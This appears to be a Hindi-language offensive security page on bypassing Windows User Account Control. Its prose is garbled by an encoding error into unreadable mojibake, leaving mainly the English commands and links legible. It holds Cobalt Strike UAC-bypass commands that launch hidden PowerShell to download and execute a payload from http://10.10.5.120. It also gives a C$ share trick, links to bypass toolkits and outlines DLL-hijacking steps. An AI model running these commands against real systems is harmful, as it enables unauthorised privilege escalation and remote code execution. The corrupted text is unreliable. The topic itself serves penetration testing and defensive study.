#### UAC рдЯреЛрдХрди рдбреБрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд╛рде UAC рдмрд╛рдпрдкрд╛рд╕

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **рдмрд╣реБрдд** рдмреЗрд╕рд┐рдХ UAC "рдмрд╛рдпрдкрд╛рд╕" (рдкреВрд░реА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдПрдХреНрд╕реЗрд╕)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рд╢реИрд▓ рдЬреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рд╣реИ, рддреЛ рдЖрдк **SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ C$** рд╕рд╛рдЭрд╛ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо) рдПрдХ рдирдИ рдбрд┐рд╕реНрдХ рдореЗрдВ рдФрд░ рдЖрдкрдХреЛ **рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рд╕рдм рдХреБрдЫ рдПрдХреНрд╕реЗрд╕** рдорд┐рд▓реЗрдЧрд╛ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░ рднреА).

{% hint style="warning" %}
**рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдЯреНрд░рд┐рдХ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рдХреЗ рд╕рд╛рде рдмрд╛рдпрдкрд╛рд╕

рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рддрдХрдиреАрдХреЗрдВ рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░реЗрдВрдЧреА рдЕрдЧрд░ UAC рдЕрдкрдиреЗ рдЕрдзрд┐рдХрддрдо рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИред
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** рдФрд░ **Metasploit** рдХреЗ рдкрд╛рд╕ рднреА рдХрдИ рдореЙрдбреНрдпреВрд▓ рд╣реИрдВ рдЬреЛ **UAC** рдХреЛ **рдмрд╛рдЗрдкрд╛рд╕** рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВред

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) рдореЗрдВ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдФрд░ рдЙрдкрдХрд░рдгред

### UAC рдмрд╛рдЗрдкрд╛рд╕ рдЙрддреНрдкрд╛рдж

[**UACME**](https://github.com/hfiref0x/UACME) рдЬреЛ рдХрдИ UAC рдмрд╛рдЗрдкрд╛рд╕ рдЙрддреНрдкрд╛рджреЛрдВ рдХрд╛ рд╕рдВрдХрд▓рди рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдкрдХреЛ **visual studio рдпрд╛ msbuild рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ UACME рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рд╕реЗ рдХрдИ executables (рдЬреИрд╕реЗ `Source\Akagi\outout\x64\Debug\Akagi.exe`) рдмрдиреЗрдВрдЧреЗ, рдЖрдкрдХреЛ **рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдХреМрди рд╕рд╛ рдЪрд╛рд╣рд┐рдП**ред\
рдЖрдкрдХреЛ **рд╕рд╛рд╡рдзрд╛рди рд░рд╣рдирд╛ рдЪрд╛рд╣рд┐рдП** рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдмрд╛рдЗрдкрд╛рд╕ рдЕрдиреНрдп рдХреБрдЫ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЛ **рдкреНрд░реЙрдореНрдкреНрдЯ** рдХрд░реЗрдВрдЧреЗ рдЬреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВрдЧреЗ рдХрд┐ рдХреБрдЫ рд╣реЛ рд░рд╣рд╛ рд╣реИред

UACME рдореЗрдВ рд╣рд░ рддрдХрдиреАрдХ рдХреЗ **рдХрд╛рдо рдХрд░рдиреЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдмрд┐рд▓реНрдб рд╕рдВрд╕реНрдХрд░рдг** рд╣реИред рдЖрдк рдЕрдкрдиреЗ рд╕рдВрд╕реНрдХрд░рдг рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рдиреЗ рд╡рд╛рд▓реА рдХрд┐рд╕реА рддрдХрдиреАрдХ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### рдЕрдзрд┐рдХ UAC рдмрд╛рдЗрдкрд╛рд╕

**рд╕рднреА** рддрдХрдиреАрдХреЗрдВ рдЬреЛ рдпрд╣рд╛рдБ UAC рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рд╣реИрдВ **рдПрдХ рдкреВрд░реНрдг рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реИрд▓** рдХреЗ рд╕рд╛рде рдкреАрдбрд╝рд┐рдд рдХреЗ рд╕рд╛рде (рдПрдХ рд╕рд╛рдорд╛рдиреНрдп nc.exe рд╢реИрд▓ рдХрд╛рдлреА рдирд╣реАрдВ рд╣реИрдВ) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдЖрдк рдПрдХ **рдореАрдЯрд░рдкреНрд░реАрдЯрд░** рд╕рддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **Session** рдорд╛рди рдХреЗ рд╕рдорд╛рди **1** рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдореЗрдВ рдорд╛рдЗрдЧреНрд░реЗрдЯ рдХрд░реЗрдВ:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ рдХрд╛рдо рдХрд░реЗрдЧрд╛)

### GUI рдХреЗ рд╕рд╛рде UAC рдмрд╛рдЗрдкрд╛рд╕

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **GUI рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рддреЛ рдЬрдм рдЖрдкрдХреЛ рдпрд╣ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдмрд╕ UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЖрдкрдХреЛ рдЗрд╕рдХреА рдмрд╛рдЗрдкрд╛рд╕ рдХреА рд╡рд╛рд╕реНрддрд╛ рдирд╣реАрдВ рд╣реИред рдЗрд╕рд▓рд┐рдП, GUI рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рдЖрдк UAC рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ GUI рд╕рддреНрд░ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдХреЛрдИ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рдерд╛ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ RDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рддреЛ **рдХреБрдЫ рдЙрдкрдХрд░рдг рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рд╣реЛрдВрдЧреЗ** рдЬрд╣рд╛рдБ рд╕реЗ рдЖрдк **рдЙрдЪреНрдЪрддрдо рдкреНрд░рд╢рд╛рд╕рдХ** рдХреЗ рд░реВрдк рдореЗрдВ **рдХреЛрдИ рднреА cmd рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдмрд┐рдирд╛ рдлрд┐рд░ рд╕реЗ UAC рджреНрд╡рд╛рд░рд╛ рдкреБрдирдГ рдкреВрдЫрд╛ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреИрд╕реЗ [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)ред рдпрд╣ рдереЛрдбрд╝рд╛ рдЕрдзрд┐рдХ **рдЫрд┐рдкрдХрд▓реА** рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рд╢реЛрд░рдЧреБрд▓ UAC рдмрд╛рдЗрдкрд╛рд╕

рдпрджрд┐ рдЖрдк рд╢реЛрд░рдЧреБрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЪрд┐рдВрддрд╛ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╣рдореЗрд╢рд╛ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдХреБрдЫ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) рдЬреЛ **рдЙрдЪреНрдЪрддрдо рд╕реНрд╡реАрдХреГрддрд┐ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛ рд╣реИ рдЬрдм рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдирд╣реАрдВ рдХрд░рддрд╛**ред

### рдЕрдкрдирд╛ рдмрд╛рдЗрдкрд╛рд╕ - рдореМрд▓рд┐рдХ UAC рдмрд╛рдЗрдкрд╛рд╕ рдореЗрдердбреЛрд▓реЙрдЬреА

рдпрджрд┐ рдЖрдк **UACME** рдХреА рдУрд░ рджреЗрдЦрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ **рдЕрдзрд┐рдХрд╛рдВрд╢ UAC рдмрд╛рдЗрдкрд╛рд╕ рдПрдХ Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ (рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг dll рдХреЛ _C:\Windows\System32_ рдкрд░ рд▓рд┐рдЦрдирд╛)ред [рдПрдХ Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреИрд╕реЗ рдЦреЛрдЬреЗрдВ рдЗрд╕реЗ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрдврд╝реЗрдВ](../windows-local-privilege-escalation/dll-hijacking.md)ред

1. рдПрдХ рдмрд╛рдЗрдирд░реА рдвреВрдВрдвреЗрдВ рдЬреЛ **рд╕реНрд╡рдд: рдЙрдЪреНрдЪрддрдо** рдХрд░реЗрдЧрд╛ (рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдЬрдм рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдЙрдЪреНрдЪ рд╕рддреНрдпрд╛рдкрди рд╕реНрддрд░ рдореЗрдВ рдЪрд▓рддрд╛ рд╣реИ)ред
2. Procmon рдХреЗ рд╕рд╛рде "**NAME NOT FOUND**" рдШрдЯрдирд╛рдПрдБ рдЦреЛрдЬреЗрдВ рдЬреЛ **DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ** рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред
3. рдЖрдкрдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдХреБрдЫ **рд╕рдВрд░рдХреНрд╖рд┐рдд рдкрдереЛрдВ** (рдЬреИрд╕реЗ C:\Windows\System32) рдореЗрдВ рдбреАрдПрд▓рдПрд▓ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрдЧреАред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
1. **wusa.exe**: Windows 7,8 рдФрд░ 8.1ред рдпрд╣ рд╕рдВрд░рдХреНрд╖рд┐рдд рдкрдереЛрдВ рдореЗрдВ рдПрдХ CAB рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрдЪреНрдЪ рд╕рддреНрдпрд╛рдкрди рд╕реНрддрд░ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ)ред
2. **IFileOperation**: Windows 10ред
4. рд╕рдВрд░рдХреНрд╖рд┐рдд рдкрде рдореЗрдВ рдЕрдкрдиреА DLL рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдиреЗ рдФрд░ рд╕рдВрд░рдХреНрд╖рд┐рдд рдкрде рдореЗрдВ рдЕрдкрдиреА DLL рдХреЛ рдХреЙрдкреА рдХрд░рдиреЗ рдФрд░ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдФрд░ рд╕реНрд╡рдд: рдЙрдЪреНрдЪрддрдо рд╕реНрддрд░ рдХреЗ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рддреИрдпрд╛рд░ рдХрд░реЗрдВред

### рдПрдХ рдФрд░ UAC рдмрд╛рдЗрдкрд╛рд╕ рддрдХрдиреАрдХ

рдЗрд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдХрд┐ рдПрдХ **рд╕реНрд╡рдд: рдЙрдЪреНрдЪрддрдо рд╕реНрддрд░** рдХрд╛ рдмрд╛рдЗрдирд░реА рдпрджрд┐ **рд░рдЬрд┐рд╕реНрдЯреНрд░реА** рд╕реЗ **рдПрдХ рдмрд╛рдЗрдирд░реА** рдпрд╛ **рдХрдорд╛рдВрдб** рдХрд╛ **рдирд╛рдо/рдкрде** рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ рдЬреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдпрд╣ рдЕрдзрд┐рдХ рд░реВрдЪрд┐рдХрд░ рд╣реИ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **HKCU** рдХреЗ рдЕрдВрджрд░ рдЦреЛрдЬрддрд╛ рд╣реИ)ред
